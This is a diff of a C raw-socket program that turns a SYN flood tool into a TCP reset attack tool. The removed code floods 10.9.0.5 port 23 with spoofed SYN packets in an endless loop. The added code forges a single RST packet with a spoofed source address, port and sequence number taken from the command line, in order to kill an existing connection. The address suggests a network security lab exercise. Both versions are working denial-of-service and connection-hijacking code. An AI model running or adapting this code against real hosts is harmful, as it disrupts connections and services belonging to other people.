@@ -1,3 +1,4 @@
+#include <assert.h>
 #include <netinet/in.h>
 #include <pcap/pcap.h>
 #include <stdint.h>
@@ -52,7 +53,9 @@ typedef struct {
 u_char packet_buffer[4096] = {0};
 u_char tcp_psuedo_buff[4046] = {0};
 
-void send_syn_packets(const char *target_ip, u_short target_port) {
+void send_reset_packet(const char *target_ip, u_short target_port,
+					   const char *source_ip, u_short source_port,
+					   u_long seq_number) {
 	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
 	int one = 1;
@@ -78,15 +81,18 @@ void send_syn_packets(const char *target_ip, u_short target_port) {
 	ip_pkt->header.ttl = 255;
 	ip_pkt->header.protocol = IPPROTO_TCP;
 	ip_pkt->header.check = 0;
+	ip_pkt->header.saddr = inet_addr(source_ip);
 	ip_pkt->header.daddr = sin.sin_addr.s_addr;
 
 	tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;
 
+	tcp_pkt->header.source = htons(source_port);
 	tcp_pkt->header.dest = htons(target_port);
+	tcp_pkt->header.seq = htonl(seq_number);
 	tcp_pkt->header.ack_seq = 0;
 	tcp_pkt->header.doff = 5;
 
-	tcp_pkt->header.th_flags = TH_SYN;
+	tcp_pkt->header.th_flags = TH_RST;
 	tcp_pkt->header.check = 0;
 	tcp_pkt->header.urg_ptr = 0;
 
@@ -101,34 +107,50 @@ void send_syn_packets(const char *target_ip, u_short target_port) {
 
 	int transmit_len = sizeof(ip_t) + sizeof(tcp_t);
 
-	while (1) {
-		ip_pkt->header.saddr = arc4random();
-		tcp_pkt->header.source = arc4random();
-		tcp_pkt->header.seq = htonl(arc4random());
+	ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));
 
-		tcp_chksum_buff->src_addr = ip_pkt->header.saddr;
+	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));
 
-		ip_pkt->header.check = 0;
-		tcp_pkt->header.check = 0;
+	tcp_pkt->header.check =
+		in_checksum((u_short *)tcp_psuedo_buff, sizeof(psh_t) + sizeof(tcp_t));
 
-		ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));
-
-		memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));
-
-		tcp_pkt->header.check = in_checksum((u_short *)tcp_psuedo_buff,
-											sizeof(psh_t) + sizeof(tcp_t));
-
-		sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
-			   sizeof(sin));
-	}
+	sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
+		   sizeof(sin));
 
 	close(sock);
 }
 
-int main() {
-	const char target_ip[] = "10.9.0.5";
-	u_short target_port = 23;
-	printf("Starting SYN flood to %s:%hu\n", target_ip, target_port);
+const char *print_usage() {
+	printf("Did not recieve enough arguments!");
+	exit(1);
 
-	send_syn_packets(target_ip, target_port);
+	return NULL;
+}
+
+#define shift(buff, len) ((len-- > 0) ? (*buff++) : (print_usage()))
+
+int main(int argc, const char **argv) {
+	// Shift out the program name
+	const char *program_name = shift(argv, argc);
+
+	const char *target_ip, *source_ip;
+	u_short target_port, source_port;
+	u_long seq_number;
+
+	target_ip = shift(argv, argc);
+	sscanf(shift(argv, argc), "%hu", &target_port);
+
+	source_ip = shift(argv, argc);
+	sscanf(shift(argv, argc), "%hu", &source_port);
+
+	sscanf(shift(argv, argc), "%lu", &seq_number);
+
+	printf("Trying reset attack on connection specified by (target=%s:%hu, "
+		   "source=%s:%hu) with seq number %lu\n",
+		   target_ip, target_port, source_ip, source_port, seq_number);
+
+	send_reset_packet(target_ip, target_port, source_ip, source_port,
+					  seq_number);
+
+	printf("Done.");
 }
